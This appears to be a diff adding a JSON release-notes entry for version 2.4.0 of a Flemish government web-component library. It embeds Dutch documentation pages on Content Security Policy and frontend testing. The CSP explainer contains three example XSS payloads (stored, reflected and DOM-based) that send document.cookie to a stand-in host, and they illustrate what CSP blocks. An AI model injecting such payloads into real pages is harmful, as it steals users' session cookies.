@@ -1,0 +1,167 @@
+{
+  "schema": 4,
+  "version": "2.4.0",
+  "ticket": "FLUX-99",
+  "entries": [
+    {
+      "id": "26e82fa",
+      "type": "feature",
+      "section": "Features",
+      "issues": [
+        "FLUX-99"
+      ],
+      "scope": null,
+      "components": [],
+      "topics": [],
+      "mentions": [],
+      "summary": "componenten CSP compliant gemaakt",
+      "text": "FLUX-99 - componenten CSP compliant gemaakt",
+      "commits": [
+        {
+          "sha": "26e82fab68a1204a65e2c04e1f6846a04297a451",
+          "url": "https://github.com/milieuinfo/flux-web-components/commit/26e82fab68a1204a65e2c04e1f6846a04297a451"
+        }
+      ],
+      "closes": [],
+      "derivedImpact": "opt-in",
+      "labels": [],
+      "wcag": [],
+      "source": {
+        "body": null,
+        "published": true,
+        "areas": {
+          "code": 30,
+          "examples": 1
+        },
+        "publishedFiles": [
+          "libs/common/src/base/base.html.element.ts",
+          "libs/components/src/block/accordion/vl-accordion.component.ts",
+          "libs/components/src/block/contact-card/vl-contact-card.component.ts",
+          "libs/components/src/block/content-header/vl-content-header.component.ts",
+          "libs/components/src/block/document/vl-document.component.ts",
+          "libs/components/src/block/http-error-message/vl-http-error-message.component.ts",
+          "libs/components/src/block/info-tile/vl-info-tile.component.ts",
+          "libs/components/src/block/infoblock/vl-infoblock.component.ts",
+          "libs/components/src/block/loader/vl-loader.component.ts",
+          "libs/components/src/block/modal/vl-modal.component.ts",
+          "libs/components/src/block/pager/vl-pager.component.ts",
+          "libs/components/src/block/proza-message/vl-proza-message.component.ts",
+          "libs/components/src/block/rich-data-table/vl-rich-data-sorter.component.ts",
+          "libs/components/src/block/rich-data-table/vl-rich-data-table.component.ts",
+          "libs/components/src/block/rich-data/vl-rich-data.component.ts",
+          "libs/components/src/block/search/vl-search.component.ts",
+          "libs/components/src/block/side-sheet/vl-side-sheet.component.ts",
+          "libs/components/src/block/tabs/vl-tabs.component.ts",
+          "libs/components/src/block/template/vl-template.component.ts",
+          "libs/components/src/block/typography/vl-typography.component.ts",
+          "libs/components/src/compliance/cookie-consent/vl-cookie-consent-opt-in.component.ts",
+          "libs/components/src/compliance/cookie-consent/vl-cookie-consent.component.ts",
+          "libs/components/src/compliance/cookie-statement/cookie/vl-cookie.component.ts",
+          "libs/components/src/compliance/cookie-statement/vl-cookie-statement.component.ts",
+          "libs/components/src/compliance/header/vl-header.component.ts",
+          "libs/components/src/compliance/next/header/vl-header.component.ts",
+          "libs/map/src/components/search/vl-map-search.ts",
+          "libs/map/src/components/side-sheet/vl-map-side-sheet-menu-item.ts",
+          "libs/map/src/components/side-sheet/vl-map-side-sheet-menu.ts",
+          "libs/map/src/vl-map.ts"
+        ],
+        "storybook": []
+      }
+    },
+    {
+      "id": "0213e61",
+      "type": "feature",
+      "section": "Features",
+      "issues": [
+        "FLUX-99"
+      ],
+      "scope": null,
+      "components": [],
+      "topics": [],
+      "mentions": [],
+      "summary": "CSP documentatie",
+      "text": "FLUX-99 - CSP documentatie",
+      "commits": [
+        {
+          "sha": "0213e619b56e65146c8336f2d97b37fdf4325f2e",
+          "url": "https://github.com/milieuinfo/flux-web-components/commit/0213e619b56e65146c8336f2d97b37fdf4325f2e"
+        }
+      ],
+      "closes": [],
+      "derivedImpact": "none",
+      "labels": [],
+      "wcag": [],
+      "source": {
+        "body": null,
+        "published": false,
+        "areas": {
+          "docs": 16,
+          "storybook": 1
+        },
+        "publishedFiles": [],
+        "storybook": [
+          {
+            "id": "richtlijnen-content-security-policy-csp-problematieken--documentatie",
+            "title": "Richtlijnen/Content Security Policy/CSP Problematieken",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-content-security-policy-csp-problematieken--documentatie",
+            "added": "# CSP Problematieken\n\n## Web-componenten problematiek\n\nWeb-componenten encapsuleren zowel (technische) logica met JavaScript als visualisatie met html en css. Sommige\ncomponenten maken ook gebruik van externe bibliotheken. Voor CSP zijn er verschillende configuratie mogelijkheden.\nVanaf dat 1 component (of de achterliggende bibliotheek) een specifieke CSP regel moet openzetten moet dit voor de\nganse toepassing gebeuren.\n\nSinds v2.4.0 van de flux-web-componenten kan CSP voor bijna alle componenten en alle regels op het meest strikte gezet\nworden. Er zijn nog een beperkt aantal uitzonderingen nodig:\n\n- het domein `https://cdn.omgeving.vlaanderen.be` moet toegestaan worden om fonts, scripts en styles uit te halen,\n  omdat we vandaaruit ondersteunende, algemene zaken beschikbaar stellen\n- de `global-header` heeft extra domeinen nodig waarnaar aanvragen mogen gebeuren, omdat elke toepassing deze component\n  integreert moet dit steeds geconfigureerd worden, zie hieronder voor meer informatie\n- bij gebruik van de `vl-map` moeten images uit `https://geo.api.vlaanderen.be` beschikbaar zijn\n- de `vl-textarea-rich` embed TinyMCE, deze heeft (net als alle alternatieve rich-text editors) de configuratie\n  `style-src-attr 'unsafe-inline';` nodig, dit moet enkel voorzien worden als de toepassing deze component gebruikt\n\n\n## CSP en de global-header\n\nT.e.m. v2.2.0 integreerden de flux-web-componenten de v4 versie van de\n[global header](https://www.vlaanderen.be/digitaal-vlaanderen/onze-diensten-en-platformen/mijn-burgerprofiel/global-header-en-footer).\nSinds v2.3.0 is er een integratie beschikbaar met de nieuwe v5 versie via de `vl-header-next` en `vl-footer-next`\ncomponent. Technische informatie over de upgrade kan je vinden in de documentatie van Digitaal Vlaanderen:\n[upgraden van global header versie 4 naar 5](https://vlaamseoverheid.atlassian.net/wiki/spaces/IKPubliek/pages/7488733769/Upgraden+van+global+header+versie+4+naar+5).\n\nDe v4 versie van de header werkte enkel met de CSP configuratie `Content-Security-Policy: script-src 'unsafe-eval';`.\nOm die rede was CSP activeren met die versie redelijk zinloos: in de volledige toepassing moest 'unsafe-eval' actief\nzijn, waardoor [XSS](/docs/richtlijnen-content-security-policy-wat-is-csp--documentatie#cross-side-scripting) mogelijk\nis.\n\nDe nieuwe v5 versie verhelpt dit probleem, 'unsafe-eval' is niet meer nodig. Door de functionaliteit van de header\nmoeten er, afhankelijk van de omgeving, wel domeinen gespecifieerd worden waarnaar specifieke aanroepen mogen\ngebeuren. De lijst met CSP configuratie (per omgeving) is te vinden in de\n[v5 global-header](https://test.widgets.burgerprofiel.dev-vlaanderen.be/docs/global-header/index.html#content-security-policy-csp)\ndocumentatie.\n\n\n## CSP en vl-textarea-rich / TinyMCE\n\nDe `vl-textarea-rich` maakt gebruik van [TinyMCE](https://github.com/tinymce/tinymce). Alle rich text editor's hebben,\nom correct te werken, dezelfde CSP regel nodig: `\"Content-Security-Policy\": \"style-src-attr 'unsafe-inline';\"`. De rede\nis dat ze dynamisch tekst stylen via het style attribuut.\n\nEen fundamentele oplossing is er niet, in alternatieve rich text editors kan je met een\n['nonce'](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce) werken of\nfunctionaliteit beperken. Een 'nonce' configureren is echter complex. Als je functionaliteit wil beperken kan je\noverwegen de gewone `vl-textarea` component te gebruiken.\n\nAls je er voor kiest `vl-textarea-rich` te gebruiken dien je dus `\"style-src-attr 'unsafe-inline';\"` te specifiëren.\nOp die manier laat je enkel toe dat scripts dynamisch het style attribuut zetten (of bewerken) op een DOM-element.\nAls alle andere CSP-regels strikt gedefinieerd zijn is er geen risico. In dat geval kunnen er geen scripts geïnjecteerd\nworden en alle scripts aanwezig zijn gekend omdat ze afkomstig zijn van een eigen (of toegelaten) domein, dus te\nvertrouwen. Het enige wat die vertrouwde scripts dan nog kunnen doen is styling, zijnde visualisatie, van DOM-elementen\nbeïnvloeden."
+          },
+          {
+            "id": "richtlijnen-content-security-policy-historiek-csp-aanpak--documentatie",
+            "title": "Richtlijnen/Content Security Policy/Historiek CSP Aanpak",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-content-security-policy-historiek-csp-aanpak--documentatie",
+            "added": "# Historiek CSP Aanpak\n\nVolgende acties werden in het verleden al genomen rond CSP:\n\n### augustus 2025 - v2.4.0\n\nVanaf v2.4.0 zijn alle componenten zo CSP-compliant mogelijk gemaakt via\n[FLUX-99](https://jira.omgeving.vlaanderen.be/jira/browse/FLUX-99). Alle componenten die reeds herschreven waren\nvia een 'next-' variant waren al CSP-compliant, er waren echter nog een hoop componenten die embedded `<style></style>`\nhadden. Deze zijn met deze release aangepast: de embedded style is verwijderd en de styling wordt nu geïnjecteerd via\nadoptedStyleSheets op de shadow-dom.\n\nDe volgende componenten werden in release v2.4.0 CSP-compliant gemaakt:\n- in **components/block**: `vl-accordion`, `vl-contact-card`, `vl-content-header`, `vl-document`,\n`vl-http-error-message`, `vl-info-tile`, `vl-infoblock`, `vl-loader`, `vl-modal`, `vl-pager`, `vl-proza-message`,\n`vl-rich-data`, `vl-rich-data-sorter`, `vl-rich-data-table`, `vl-search`, `vl-side-sheet`, `vl-tabs`, `vl-template`,\n`vl-typography`\n- in **components/compliance**: `vl-cookie-consent`, `vl-cookie-consent-opt-in`, `vl-cookie`, `vl-cookie-statement`,\n`vl-header`, `vl-header-next`\n- in **components/map**: `vl-map`, `vl-map-search`, `vl-map-side-sheet-menu`, `vl-map-side-sheet-menu-item`\n\nDe enige component die niet volledig CSP-compliant is is `vl-textarea-rich`,\nzie [CSP en vl-textarea-rich / TinyMCE](/docs/richtlijnen-content-security-policy-csp-problematieken--documentatie#csp-en-vl-textarea-rich--tinymce)\nvoor meer informatie hierrond.\n\n### juni 2025 - v2.3.0\n\nVia [FLUX-100](https://jira.omgeving.vlaanderen.be/jira/browse/FLUX-100) is een CSP veilige versie van de header\n(vl-header-next) en de footer (vl-footer-next) beschikbaar.\n\n### april 2024\n\nIn de 2e helft van 2024 worden alle elementen omgezet naar volwaardige componenten. Deze nieuwe code wordt ineens\nCSP-compliant gemaakt.\n\n### november 2023\n\nSinds eind 2023 worden de form componenten herschreven. We streven er naar die ineens CSP-compliant te maken. We\ndoen dit o.a. door de CSP-compliancy af te testen in de integrator-app.\n\n### maart 2023\n\nHet volgende is gemeld op de [TAW van 02/03/2023](https://www.milieuinfo.be/confluence/display/AEO/2023-03-02%3A%3A+Verslag)\ndoor Christophe De Blende en besproken:\n\n> Ik heb zo het gevoel dat de urgentie van CSP onderschat wordt. Hier een paar statistieken van de verschillende\naanvallen die op de RP innet gecapteerd worden: <a href=\"top-threats-20221013.pdf\" target=\"_blank\">23/10/2022</a>, <a href=\"top-threats-20230213.pdf\" target=\"_blank\">23/02/2023</a> en <a href=\"top-threats-20230227.pdf\" target=\"_blank\">27/02/2023</a>.\nVan belang, al wat via SSL gebeurt zien we zelf niet. Dus er zijn veel exploits die nog niet gedetecteerd worden\nomwille van de huidige firewall / ssl terminatie setup.<br/>\nEr is wel een tijdje een firewall loop toegevoegd geweest om log4j shell exploit te kunnen firefighten en deze\nstatistieken zijn ook meegenomen. Om aan te geven dat je met een factor 100 mag vermenigvuldigen wat je nu ziet\nin de dagdagelijkse statistieken.\n\nHierbij zijn er volgende vragen / bemerkingen:\n- hoe verhouden die statistieken zich tot CSP: welke zullen er verminderen / verdwijnen als CSP actief wordt ?\n- het 'algemeen activeren van CSP' op de reverse-proxy (wat Lode al eens geprobeerd zou hebben - op ontwikkel?) is\nniet zinvol, veel toepassingen zullen dan niet meer werken\n- CSP activatie zou applicatie per applicatie moeten doorgevoerd worden, omdat dit een grote doorlooptijd\n(maanden / jaren) zal hebben zouden statistieken per sub-domein uitgesplitst moeten worden om impact te kunnen zien\n\n### januari 2023\n\nIn het kader van ticket [UIG-2207](https://www.milieuinfo.be/jira/browse/UIG-2207) zijn er beperkt zaken bekeken."
+          },
+          {
+            "id": "richtlijnen-content-security-policy-hoe-csp-activeren--documentatie",
+            "title": "Richtlijnen/Content Security Policy/Hoe CSP Activeren",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-content-security-policy-hoe-csp-activeren--documentatie",
+            "added": "# Hoe CSP Activeren\n## Voorbereiding\n## Ideale CSP-configuratie\n## Lossere CSP Regels\n### CSP Hash\n### CSP Nonce\n## CSP Voorbeeld\n(106 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-content-security-policy-wat-is-csp--documentatie",
+            "title": "Richtlijnen/Content Security Policy/Wat Is CSP",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-content-security-policy-wat-is-csp--documentatie",
+            "added": "# Wat Is CSP\n\n## Inleiding\n\nContent Security Policy (CSP) is een beveiligingsmechanisme, te configureren in de HTTP-headers van je webapplicatie.\nHet bepaalt welke bronnen (scripts, styles, afbeeldingen, fonts, iframes, etc.) een browser mag laden en\nuitvoeren.\n\nCSP is ontworpen om aanvallen als Cross-Site Scripting (XSS) en data-injectie te voorkomen. Zonder CSP kan een aanvaller\nkwaadaardige inline scripts of externe bestanden injecteren en uitvoeren. Met CSP kun je dat beperken tot expliciet\nvertrouwde bronnen.\n\n - Je kunt per type bron (script, style, img, font, frame, …) aangeven wat wél en niet mag.\n - Inline scripts / styles worden standaard geblokkeerd, tenzij je ze expliciet toestaat (met 'unsafe-inline', nonces of\n   hashes).\n - CSP maakt het veel moeilijker voor aanvallers om via XSS code uit te voeren, de browser weigert alle ongeautoriseerde\n   content.\n\nCSP is een extra beveiligingslaag bovenop secure coding en inputvalidatie. Het doel is niet alleen aanvallen te\nblokkeren, maar ook om het aanvalsoppervlak te verkleinen en fouten sneller zichtbaar te maken tijdens ontwikkeling.\n\n## Cross Side Scripting\n\nEén van de belangrijkste zaken waartegen je je kan beschermen met CSP is tegen Cross Side Scripting (XSS). Een uitleg\nvan wat XSS is vind je in het artikel [cross site scripting xss](https://auth0.com/blog/cross-site-scripting-xss), hoe\nje je dan met CSP daartegen kan beschermen staat uitgelegd in\n[defending against xss with csp](https://auth0.com/blog/defending-against-xss-with-csp). Voor toepassingen die een SPA\nopzet volgen is er het specifiekere artikel [deploying csp in spa](https://auth0.com/blog/deploying-csp-in-spa).\n\nHet hoofddoel om CSP te activeren is om te zorgen dat een webtoepassing enkel eigen, vertrouwde code bevat en uitvoert.\nEnkel de eigen geschreven / voorziene javascript, html en css mag getoond en uitgevoerd worden. Wijzigen, tonen of\nuitvoeren van 'andere' code wordt afgeblokt.\n\nVoorbeelden van XSS, die tegengehouden wordt, zijn:\n\n### Stored XSS tegenhouden\n\nIn input velden zou malicious code ingevoerd kunnen worden conform:\n\n```\n<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>\n```\n\nAls deze code dan (denk bvb. in het geval van een blog) door een andere gebruiker geopend en uitgevoerd wordt kunnen er\nongewenst gegevens gecapteerd worden.\n\n### Reflected XSS tegenhouden\n\nLinks (aangeboden via een href of verborgen via een shortening service) die refereren naar een toepassing kunnen\nscripts bevatten:\n\n```\nhttp://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E\n```\n\n### DOM based XSS tegenhouden\n\nIn de DOM kan (door via een malicious website omgeleid te zijn) geldige, maar kwaadwillige html gestoken zijn.\n\n```\n<img src=\"noimage\" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)/>\n```\n\n### CSS XSS tegenhouden\n\nZie het filmpje en de presentatie op [xss no the other s](https://mikewest.org/2013/09/xss-no-the-other-s-cssconfeu-2013)."
+          },
+          {
+            "id": "richtlijnen-testen-klassieke-test-piramide--documentatie",
+            "title": "Richtlijnen/Testen/Klassieke Test Piramide",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-testen-klassieke-test-piramide--documentatie",
+            "added": "# Klassieke Test Piramide\n\n<br/>\n<img src={klassiekeTestPiramide} alt=\"Klassieke Test Piramide\" height=\"350px\"/>\n<br/>\n<br/>\n\nDe meest simpele variant van de test piramide gaat op voor alle type toepassingen. Het is het minimale wat dient te\ngebeuren rond testen, de feitelijke uitvoering ligt open. Volgende concepten zitten vervat in de piramide:\n\n- het doel is minimale overlap te hebben tussen de niveaus: wat al getest is op een lager niveau dient niet meer getest\n  te worden op een hoger niveau\n- naarmate je dichter bij de top komt\n  * stijgt de complexiteit van de testen\n  * stijgt de implementatie tijd\n  * stijgt de doorlooptijd van uitvoering\n  * daalt de hoeveelheid van 'dat' type testen\n\n> **conceptueel: probeer 'wat' je wil testen zo laag als mogelijk in de piramide te doen**"
+          },
+          {
+            "id": "richtlijnen-testen-selenium-en-cypress--documentatie",
+            "title": "Richtlijnen/Testen/Selenium en Cypress",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-testen-selenium-en-cypress--documentatie",
+            "added": "# Selenium en Cypress\n\n## Inleiding\n\nBij Departement Omgeving wordt typisch Selenium gebruikt voor frontend testen. Selenium wordt algemeen veel gebruikt,\nis goed gedocumenteerd, maar niet ideaal. Het artikel\n[cypress, the selenium killer](https://blog.logrocket.com/cypress-io-the-selenium-killer/) beschrijft de problemen die\nik typisch ook ervaar met Selenium.\n\n\n## Selenium\n\nEen aantal algemene artikels die Selenium goed beschrijven zijn:\n\n- de [Selenium website](https://www.selenium.dev)\n- de [Selenium wikipedia](https://en.wikipedia.org/wiki/Selenium_(software)) pagina\n- een [introductie tot Selenium](https://www.guru99.com/introduction-to-selenium.html)\n\nSelenium heeft een [flexibele architectuur](https://www.interviewbit.com/blog/selenium-architecture) met web-driver's\nwaardoor het historisch een breed scala van talen (om testen in te schrijven) en browsers ondersteund. Typisch werden\ndeze testen (vroeger in [SSR toepassingen](/docs/applicatief-testen-test-piramide-ssr-vs-spa--documentatie)) in dezelfde taal als de\napplicatie (bij DOMG dus in Java) geschreven. Toepassingen zijn geëvolueerd richting SPA's, in JavaScript geschreven.\nDaar Selenium ook JavaScript ondersteuning heeft is dan vaak die test tool behouden. In de opzet van een SPA zijn er\nechter betere alternatieven.\n\n\n## Eenduidigheid\n\nVolgende factoren maken het minder eenduidig wat er in de DOM gebeurt:\n\n- bij een responsive toepassing zullen afhankelijk van de resolutie waarop getest wordt elementen onzichtbaar worden,\n  een ander formaat of andere positie hebben\n- door web-componenten met een shadow DOM is de DOM-structuur minder transparant\n- frameworks en component bibliotheken doen soms auto-magische zaken\n\n\n## Selenium en SPA's\n\n### Page Object Model\n\nDe [POM](https://www.selenium.dev/documentation/test_practices/encouraged/page_object_models/) aanpak die vaak\ngebruikt wordt is zinvol voor SSR's, je hebt verschillende pagina's met hun eigen url. Er is een 1 op 1 mapping\nvan de pagina met het POM. Voor een SPA is dat lastiger, er is maar 1 page waarbinnen alles dynamisch gebeurt.\nVasthouden aan het POM kan, maar zal niet eenduidig zijn.\n\n\n## Cypress\n\nAlle informatie hierover is te vinden op de [Cypress detail](/docs/bijdragen-cypress--documentatie) pagina."
+          },
+          {
+            "id": "richtlijnen-testen-technische-test-aanpak-frontend--documentatie",
+            "title": "Richtlijnen/Testen/Technische Test Aanpak Frontend",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-testen-technische-test-aanpak-frontend--documentatie",
+            "added": "# Technische Test Aanpak Frontend\n\n## Unit Testen\n\nJest\n\n\n## Component Testen\n\nCypress & Storybook\n\n\n## Te Vermijden: Flaky Testen\n\n[Flaky testen](https://dev.to/codux/flaky-tests-and-how-to-deal-with-them-2id2) zijn testen die typisch lukken,\nmaar 'soms' niet. De soms hangt af van randvoorwaarden als: de snelheid van de computer waar de testen / de toepassing\nop draaien, extra belastingen van het systeem, een trager netwerk, ... .\nDes te dynamischer toepassingen worden, des te flaky-er testen worden. De oorzaak is nooit het test framework,\neen tool die de problematiek echter in acht neemt kan de flakiness wel beperken en beheersbaar maken.\n\nOorzaken van flakiness zijn vaak asynchrone gebeurtenissen:\n\n- door het gebruik van promises, async/await, observables (RxJS)<br/>\n-> eventueel ten gevolge van het maken van een reactive toepassing\n- events die gebeuren vanuit de server kant: via SSE of een websocket\n\n\n## Timing Problemen\n\nSelenium stamt uit 2004, een tijd waar de aanpak om een webtoepassing te schrijven was: het dynamisch maken van\nmeerdere statische pagina's. Als het dynamische er uit bestaat te antwoorden met een volledig nieuwe pagina werkt\nSelenium perfect: het selecteren en verifiëren van aanwezige DOM elementen lukt feilloos. Vanaf dat er AJAX\n(Asynchronous JavaScript And XML) gebruikt werd, lag het al moeilijker. De feitelijke DOM-structuur wijzigt dan\nten gevolge van gebruiker acties. Doordat AJAX bewust en gecontroleerd gebruikt werd, viel het nog wel mee om\neen Selenium test te schrijven. Je gebruikt typisch het patroon: wachten tot 'iets verwacht' gebeurt, om daarna\nverder te gaan.\n\nBij een SPA is het echter minder eenduidig wat er in de DOM gebeurt, zie hiervoor de uitgebreidere uitleg m.b.t.\n[eenduidigheid](/docs/richtlijnen-testen-selenium-en-cypress--documentatie#eenduidigheid)."
+          },
+          {
+            "id": "richtlijnen-testen-test-piramide-component-bibliotheek--documentatie",
+            "title": "Richtlijnen/Testen/Test Piramide Component Bibliotheek",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-testen-test-piramide-component-bibliotheek--documentatie",
+            "added": "# Test Piramide Component Bibliotheek\n\n## Inleiding\n\nHet Flux-team bouwt een component bibliotheek, dit is verschillend van een eindtoepassing. Om die componenten afgebakend\nte testen wordt de algemene test aanpak gevolgd met een specifieke invulling.\n\n\n## Variant op de SPA Test Piramide\n\nDe test piramide voor de component bibliotheek volgt de\n[klassieke test piramide](/docs/applicatief-testen-klassieke-test-piramide--documentatie) en is een variant op de\n[SPA test piramide](/docs/applicatief-testen-test-piramide-ssr-vs-spa--documentatie).\n\n<br/>\n<img src={cbTestPiramide} alt=\"Component Bibliotheek Test Piramide\" height=\"450px\"/>\n<br/><br/>\n\nOm de component bibliotheek te testen zijn volgende keuzes gemaakt:\n\n- de code wordt in [TypeScript](https://www.typescriptlang.org/) geschreven zodat we een stabiele basis verkrijgen die\n  o.a. refactorings minder fout gevoelig maakt\n- er zijn minimale unit testen, enkel daar waar 'logica' zit die onafhankelijk is van visualisatie (html / css) -\n  bvb. in de map actions\n  <br/>-> net omdat er geen business logica hoort te zitten in UI-componenten\n- de focus ligt op visuele component testen, hiervoor worden de componenten geïntegreerd in\n  [Storybook](https://storybook.js.org/)\n- Storybook geeft een 3 in 1 voordeel: de component wordt echt geïntegreerd - inclusief varianten - in een toepassing\n  (Storybook) die de documentatie (visueel raadpleegbaar) vormt van diezelfde component; na de integratie worden dan\n  de testen geschreven (2-staps proces)\n- een beperkt aantal componenten is een compositie van andere componenten, de testen daarvoor kunnen gezien worden als\n  component-integratie testen; omdat dat echter zelf een component is zien we dat als gewone component testen, hierdoor\n  zijn er dus geen integratie testen\n- e2e-testen zijn er niet, de component bibliotheek bevat bouwstenen, dat is het finale product\n- de bibliotheek wordt aangeboden via verschillende artefacts, om de garantie te hebben dat die artefacts afneembaar\n  zijn door andere teams is er de Consumer toepassing - die technisch op dezelfde manier de artefacts integreert zoals\n  een toepassing dat doet - de testen daarvoor zijn de 'artefact integratie testen'"
+          },
+          {
+            "id": "richtlijnen-testen-test-piramide-ssr-vs-spa--documentatie",
+            "title": "Richtlijnen/Testen/Test Piramide SSR vs SPA",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-testen-test-piramide-ssr-vs-spa--documentatie",
+            "added": "# Test Piramide: SSR vs SPA\n\n## SRR vs SPA\n\n<br/>\n<img src={ssrVsSpa} alt=\"Ssr vs Spa\" height=\"450px\"/>\n\n\n## Testen van een SSR\n\nVroeger werden toepassingen typisch gebouwd als server-side rendering applicaties. Voor hedendaagse toepassingen die\ndichter aanleunen bij een website dan bij een complexere webtoepassing kan SSR nog steeds de voorkeur genieten.\nVeel toepassingen bij Departement Omgeving zijn als SSR-toepassing geschreven. De frontend werkt dan niet onafhankelijk\nvan de backend maar zit erin vervat, het is een backend gestuurde toepassing. Er zullen unit en integratie testen zijn,\nmaar hoofdzakelijk voor de Java code die eerder backend gefocused is. Voor de frontend testen is het dan zinvol je te\nbeperken tot e2e-testen. Die e2e-testen zijn dan wel de enige frontend testen en zouden dan best zowel het happy\nals (beperkt) het unhappy pad moeten afdekken. Logica zal zich eerder in de Java code bevinden, niet alle varianten van\ngeldige en ongeldige input dient dus via de frontend afgetest te worden daar dit al op een lager niveau in de piramide\ngetest werd.\n\nVoor een SSR-toepassing ziet de test piramide er conceptueel als volgt uit:\n<img src={ssrTestPiramide} alt=\"Ssr Test Piramide\" height=\"350px\"/>\n<br/>\n\nDe feitelijke backend test aanpak kan fijner uitgetekend worden, dit is echter buiten de scope van dit document (dat\nzich beperkt tot frontend).\n\n\n## Testen van een SPA\n\nVoor complexere web toepassingen heeft de\n[Single Page Application](https://nl.wikipedia.org/wiki/Single_Page_Application) aanpak de voorkeur. Een SPA kan je\nzien als een volwaardige toepassing die eenmalig ingeladen wordt in de browser (of aanwezig is op bvb. een tablet) en\ncommuniceert met 1 (of meerdere) backends. In tegenstelling tot een SSR kan je om een SPA te testen wel de volledige\ntest piramide in beschouwing nemen. Een uitgebreidere uitleg hierover vind je in het Medium artikel\n[Testing Single Page Applications](https://medium.com/inspiredbrilliance/testing-single-page-applications-b4001adc6452),\neventueel vind je <a href=\"testing-single-page-applications-medium.pdf\" target=\"_blank\">hier</a> een kopie.\n\nSamengevat komt het erop neer dat een goed geschreven SPA uit onderdelen bestaat die op test vlak alliëren met de lagen\nvan de test piramide:\n- functionele logica - ongerelateerd aan UI zaken - zit afgebakend, hier tegenover worden unit testen geschreven\n- basis (herbruikbare) UI-functionaliteit zit in componenten, daar worden component testen voor geschreven - er\n  dient een opzet voorzien te worden om componenten standalone te kunnen testen\n- componenten kunnen gegroepeerd worden, denk bvb. aan complexere formulieren of wizards, die kan je geïntegreerd\n  testen (component integratie testen)\n- afhankelijk van de maturiteit al dan niet in combinatie met een framework kan de toepassing in modules opgesplitst\n  worden, een module (die bestaat uit een store, een router, componenten, ...) kan onafhankelijk van andere modules\n  getest worden, dit zijn dan ook integratie testen\n- de feitelijke eindtoepassing kan je e2e testen, afhankelijk van de kwaliteit van de backend en de team-samenstelling\n  kan je e2e testen t.o.v. een draaiende backend of opteren om de backend-calls te mocken\n\nBij een SPA zit er meer code en logica in de frontend dan bij een SSR-toepassing. Daar er echter met een scripting taal\ngewerkt wordt is het aan te bevelen een extra kwaliteitslaag toe te voegen: een linter of een transpiler. In de backend\nheb je - vaak zonder te beseffen - een compiler die er voor zorgt dat de code die je test minstens 'loopt'. In de\nfrontend heb je die garantie niet, door bvb. in [TypeScript](https://www.typescriptlang.org/) te werken en een\ntranspiler toe te voegen verhoog je dus met een minimale inspanning al de kwaliteit.\n\nVoor een SPA ziet de volledige test piramide er als volgt uit:\n\n<img src={spaTestPiramide} alt=\"Spa Test Piramide\" height=\"450px\"/>\n\n> Dit lijkt mogelijks nodeloos 'gelaagd' of 'complex' maar is het niet. Een transpiler / linter (wat optioneel is maar\naanbevolen wordt) maakt deel uit van het ontwikkel / build proces (net zoals bij Java ontwikkeling). Unit testen zijn\ntypisch beperkt, de overige testen (component / component integratie / e2e) kan je zo opzetten dat het technische\nvarianten zijn; zodat ze praktisch niet aanvoelen als een ander type test.\n\n> 1 van de doelen van een SPA is de backend simpeler, eenduidiger en meer stateless te maken. Hierdoor\nverschuift een deel van de logica en complexiteit naar de frontend. Er zal dus meer getest worden in de frontend,\nmaar minder in de backend t.o.v. een SSR-toepassing."
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-toegankelijkheid-en-wcag--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/Toegankelijkheid en WCAG",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.4.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-toegankelijkheid-en-wcag--documentatie",
+            "added": null
+          }
+        ]
+      }
+    }
+  ]
+}
